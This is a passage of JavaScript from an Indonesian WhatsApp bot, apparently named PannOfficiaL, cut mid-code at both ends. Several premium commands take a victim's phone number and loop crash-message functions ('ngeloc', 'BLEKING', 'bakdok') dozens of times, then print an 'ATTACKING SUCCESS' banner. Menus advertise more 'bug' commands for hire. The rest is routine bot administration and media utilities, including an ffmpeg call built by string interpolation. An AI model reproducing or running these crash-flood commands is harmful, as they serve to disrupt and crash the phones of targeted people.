await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'xwangsaf': case 'xmods': case 'xpann': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'xios': case 'iphone': case 'xip':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await beta2(PannOfficiaL, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(PannOfficiaL, target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'overflow': case 'vasion': case 'crashflow': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case "owner": {
if (!isPremium) return reply('Mau Ngapain Dek ??')
const repf = await PannOfficiaL.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
PannOfficiaL.sendMessage(from, { text : `Nih Owner Gw Jangan Macem"`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break

case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await PannOfficiaL.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break

case 'setowner': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} 62×××`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
}
break

case 'self': {
if (!isOwner) return reply(mess.only.owner)
PannOfficiaL.public = false
reply('Succes Mode Private')
}
break

case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await PannOfficiaL.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case 'public': {
if (!isOwner) return reply(mess.only.owner)
PannOfficiaL.public = true
reply('Succes Mode Public')
}
break

case "qc": {
if (!isOwner)return reply(mess.only.owner)
if (!quoted){
const getname = await PannOfficiaL.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
PannOfficiaL.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
PannOfficiaL.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} rafzmids`)
}
}
break

case 'mangap': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break

case 'ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await PannOfficiaL.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> PannOfficiaL - AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/PannOfficiaL.jpg')}, { upload: PannOfficiaL.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
"buttonParamsJson": `{"display_text":"Nice PannOfficiaL - AI","id":".mangap"}`
            }],
          }),
          contextInfo: {
  mentionedJid: [m.sender], 
  forwardingScore: 999,
  isForwarded: true,
forwardedNewsletterMessageInfo: {
  newsletterJid: '0@newsletter',
  newsletterName: namabot,
  serverMessageId: 143
}
}
       })
    }
  }
}, { quoted: m })
await PannOfficiaL.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("Error Kak :(")
}
}
break

case 'halobang': {
if (!isPremium) return reply(mess.only.premium)
let teksbang = `
𝖀𝖓𝖙𝖚𝖐 𝕭𝖚𝖌 𝕻𝖎𝖑𝖎𝖍 𝖄𝖆𝖆
(𝗨𝗻𝘁𝘂𝗸 𝗕𝘂𝗴 𝗣𝗶𝗹𝗶𝗵 𝗬𝗮𝗮)

 令 .𝘂𝗶𝘀𝘆𝘀𝘁𝗲𝗺 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗱𝗲𝘃𝗶𝗰𝗲 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝘂𝗶𝗰𝗿𝗮𝘀𝗵 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗯𝘂𝗴𝘂𝗶 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗺𝗲𝗺𝗲𝗸 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 
 ☝ ＡＤＡ ５ ＰＩＬＩＨＡＮ ＢＵＡＴ ＢＵＧ ☝
 
╭━━━━━━━━━━━━━━ᬼ
│
║ ​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗲𝘁𝗮𝗽 𝗖𝗲𝗻𝘁𝗮𝗻𝗴 𝟮 𝗠𝗮𝗸𝗮 𝘀𝗲𝗱𝗮𝗻𝗴 𝗱𝗲𝗹𝗮𝘆 𝗺𝗮𝗸𝗲𝗿
║ ​᭄ 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗸𝗶𝘁𝗮𝗿 𝟱-𝟭𝟬 𝗺𝗲𝗻𝗶𝘁 𝗷𝗶𝗸𝗮 𝘄𝗼𝗿𝗸 𝘄𝗮𝗷𝗶𝗯 𝘁𝗮𝗴 𝗣𝗮𝗻𝗻𝗢𝗳𝗳𝗰
║​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗶𝗱𝗮𝗸 𝗪𝗼𝗿𝗸 𝗔𝘁𝗮𝘂 𝗚𝗮𝗴𝗮𝗹 𝗖𝗼𝗯𝗮 𝗟𝗮𝗴𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗬𝗮𝗻𝗴 𝗟𝗮𝗶𝗻 ᬊ
│
│ೄྀ 𝗖𝟭 𝗪𝗔𝗝𝗜𝗕 𝗦𝗧𝗢𝗥 𝗞𝗘 6283896168476 
║
║ ================== ☠️
│
╰━━━━━━━━━━━━━━━━━━━━ᬼ`
reply(teksbang)
}
break

case 'bang-on?': {
if (!isPremium) return reply(mess.only.premium)
let teksbang = `
𝖀𝖓𝖙𝖚𝖐 𝕭𝖚𝖌 𝕻𝖎𝖑𝖎𝖍 𝖄𝖆𝖆
(𝗨𝗻𝘁𝘂𝗸 𝗕𝘂𝗴 𝗣𝗶𝗹𝗶𝗵 𝗬𝗮𝗮)

 令 .𝘂𝗶𝘀𝘆𝘀𝘁𝗲𝗺 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗱𝗲𝘃𝗶𝗰𝗲 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝘂𝗶𝗰𝗿𝗮𝘀𝗵 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗯𝘂𝗴𝘂𝗶 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗺𝗲𝗺𝗲𝗸 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 
 ☝ ＡＤＡ ５ ＰＩＬＩＨＡＮ ＢＵＡＴ ＢＵＧ ☝
 
╭━━━━━━━━━━━━━━ᬼ
│
║ ​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗲𝘁𝗮𝗽 𝗖𝗲𝗻𝘁𝗮𝗻𝗴 𝟮 𝗠𝗮𝗸𝗮 𝘀𝗲𝗱𝗮𝗻𝗴 𝗱𝗲𝗹𝗮𝘆 𝗺𝗮𝗸𝗲𝗿
║ ​᭄ 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗸𝗶𝘁𝗮𝗿 𝟱-𝟭𝟬 𝗺𝗲𝗻𝗶𝘁 𝗷𝗶𝗸𝗮 𝘄𝗼𝗿𝗸 𝘄𝗮𝗷𝗶𝗯 𝘁𝗮𝗴 𝗣𝗮𝗻𝗻𝗢𝗳𝗳𝗰
║​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗶𝗱𝗮𝗸 𝗪𝗼𝗿𝗸 𝗔𝘁𝗮𝘂 𝗚𝗮𝗴𝗮𝗹 𝗖𝗼𝗯𝗮 𝗟𝗮𝗴𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗬𝗮𝗻𝗴 𝗟𝗮𝗶𝗻 ᬊ
│
│ೄྀ 𝗖𝟭 𝗪𝗔𝗝𝗜𝗕 𝗦𝗧𝗢𝗥 𝗞𝗘 6283896168476 
║
║ ================== ☠️
│
╰━━━━━━━━━━━━━━━━━━━━ᬼ`
reply(teksbang)
}
break

case 'pannoffc-vipp': {
if (!isPremium) return reply(mess.only.premium)
let teksbang = `
𝖀𝖓𝖙𝖚𝖐 𝕭𝖚𝖌 𝕻𝖎𝖑𝖎𝖍 𝖄𝖆𝖆
(𝗨𝗻𝘁𝘂𝗸 𝗕𝘂𝗴 𝗣𝗶𝗹𝗶𝗵 𝗬𝗮𝗮)

 令 .𝘂𝗶𝘀𝘆𝘀𝘁𝗲𝗺 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗱𝗲𝘃𝗶𝗰𝗲 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝘂𝗶𝗰𝗿𝗮𝘀𝗵 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗯𝘂𝗴𝘂𝗶 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗺𝗲𝗺𝗲𝗸 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 
 ☝ ＡＤＡ ５ ＰＩＬＩＨＡＮ ＢＵＡＴ ＢＵＧ ☝
 
╭━━━━━━━━━━━━━━ᬼ
│
║ ​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗲𝘁𝗮𝗽 𝗖𝗲𝗻𝘁𝗮𝗻𝗴 𝟮 𝗠𝗮𝗸𝗮 𝘀𝗲𝗱𝗮𝗻𝗴 𝗱𝗲𝗹𝗮𝘆 𝗺𝗮𝗸𝗲𝗿
║ ​᭄ 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗸𝗶𝘁𝗮𝗿 𝟱-𝟭𝟬 𝗺𝗲𝗻𝗶𝘁 𝗷𝗶𝗸𝗮 𝘄𝗼𝗿𝗸 𝘄𝗮𝗷𝗶𝗯 𝘁𝗮𝗴 𝗣𝗮𝗻𝗻𝗢𝗳𝗳𝗰
║​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗶𝗱𝗮𝗸 𝗪𝗼𝗿𝗸 𝗔𝘁𝗮𝘂 𝗚𝗮𝗴𝗮𝗹 𝗖𝗼𝗯𝗮 𝗟𝗮𝗴𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗬𝗮𝗻𝗴 𝗟𝗮𝗶𝗻 ᬊ
│
│ೄྀ 𝗖𝟭 𝗪𝗔𝗝𝗜𝗕 𝗦𝗧𝗢𝗥 𝗞𝗘 6283896168476 
║
║ ================== ☠️
│
╰━━━━━━━━━━━━━━━━━━━━ᬼ`
reply(teksbang)
}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('../database/lib//uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? PannOfficiaL.user.jid : m.sender;
//const name = await PannOfficiaL.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await PannOfficiaL.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  PannOfficiaL.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('../database/lib//uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? PannOfficiaL.user.jid : m.sender;
//const name = await PannOfficiaL.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await PannOfficiaL.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  PannOfficiaL.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break

case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
